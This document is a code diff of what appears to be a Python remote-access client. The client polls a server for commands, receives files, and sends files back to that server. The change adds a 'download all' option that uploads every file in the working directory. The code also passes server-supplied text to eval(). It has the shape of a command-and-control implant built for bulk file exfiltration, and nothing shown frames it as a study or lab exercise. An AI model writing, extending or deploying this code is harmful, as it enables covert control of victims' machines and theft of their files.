@@ -1,7 +1,7 @@
 #!/usr/bin/python3 
 import requests
 import subprocess
-from os import path
+from os import path,listdir
 
 class Client():
     def __init__(self,server):
@@ -44,7 +44,7 @@ class Client():
             else:
                 R = requests.post(self.server, OUT)
     
-    def fileReciver(self,command):
+    def fileReciver(self,command):    
         f=command.split("upload ")[1]
         dataDict=eval(f)
         fileName=dataDict['file']
@@ -56,15 +56,21 @@ class Client():
         except Exception as e:
             R = requests.post(self.server,(str(e)).encode('utf-8'))
 
-    def fileSender(self,command):
-        fileName=command.split("download ")[1]
-        if path.exists(fileName):
-            upload=self.server+"/upload"    
-            file={'file': open(fileName,"rb"),'name':fileName }
-            requests.post(upload,files=file)     
-        else:
-            R = requests.post(self.server,("File missing").encode('utf-8'))
+    def sender(self,filename):
+        upload=self.server+"/upload"    
+        file={'file': open(filename,"rb"),'name':filename }
+        requests.post(upload,files=file) 
 
+    def file(self,command):
+        file=command.split("download ")[1]
+        if file.startswith("all"):
+            for file in listdir():
+                self.sender(file)
+        else:
+            if path.exists(file):
+                self.sender(file)
+            else:
+                R = requests.post(self.server,("File missing").encode('utf-8'))
 
 def main():
     server=None
@@ -74,7 +80,7 @@ def main():
             RevcivedData = requests.get(server)
             command = RevcivedData.text
             if command.startswith("download "):
-                obj.fileSender(command)
+                obj.file(command)
             elif command.startswith("upload "):
                 obj.fileReciver(command)
             elif command.startswith("-"):
